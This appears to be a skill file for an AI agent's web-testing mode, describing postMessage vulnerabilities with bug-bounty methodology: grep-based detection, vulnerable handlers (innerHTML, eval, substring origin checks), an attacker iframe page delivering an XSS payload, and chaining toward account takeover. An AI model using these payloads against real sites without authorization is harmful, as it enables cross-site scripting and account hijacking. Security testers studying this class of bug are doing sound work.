# SKILL: postMessage Attacks

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (postmessage attacks) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Cross-origin window.postMessage handlers without origin check or with weak deserialization → DOM XSS / data exfil.

---

## DETECTION
Grep client JS for `addEventListener('message',...)` and `window.onmessage`. Look for missing `event.origin` checks or deserialization of `event.data`.

## EXPLOITATION
### Missing origin check
```javascript
// vulnerable handler
window.addEventListener('message', e => {
  document.getElementById('x').innerHTML = e.data.html;   // XSS
});
```
Attacker page:
```html
<iframe src="https://target.com/?x=1" id=t></iframe>
<script>document.getElementById('t').contentWindow.postMessage({html:'<img src=x onerror=alert(1)>'},'*')</script>
```

### Weak origin check (substring)
```javascript
if (e.origin.includes('target.com')) { ... }   // matches target.com.attacker.tld
```

### eval / function ctor on data
```javascript
window.addEventListener('message', e => eval(e.data));   // RCE-like via XSS
```

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Origin must use exact equality. Devs often write `startsWith` or `includes` → bypassable.

## CHAIN POTENTIAL
postMessage → DOM XSS → ATO.

## TOOLS
Burp DOM Invader (post message tab) — best automated detector

## COMMANDS
DOM Invader → toggle postMessage logging → walk app

## EDGE CASES / NOT-A-BUG TRAPS
Modern apps use BroadcastChannel and structured cloning — same risk class.

## TRIAGE ANGLE (per platform)
Show DOM XSS PoC firing from attacker.tld iframe parent.

## SEVERITY & CVSS
7.5–9.0.

## REFERENCES
PortSwigger DOM Invader / postMessage
